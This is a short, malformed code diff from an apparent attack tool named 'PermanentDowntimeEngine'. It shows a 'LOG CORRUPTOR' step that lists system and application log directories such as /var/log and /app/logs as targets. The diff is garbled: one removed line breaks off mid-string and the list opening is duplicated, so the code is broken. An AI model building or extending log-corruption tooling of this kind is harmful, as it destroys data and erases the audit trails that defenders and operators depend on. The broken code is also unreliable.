@@ -833,7 +833,7 @@ class PermanentDowntimeEngine:
         console.print("[red]📝 ACTIVATING LOG CORRUPTOR[/]")
         
         log_endpoints = [
-            '/var/log', '/
+            '/var/log',
         log_endpoints = [
             '/var/log', '/logs', '/log', '/tmp/logs',
             '/application/logs', '/app/logs', '/system/logs',
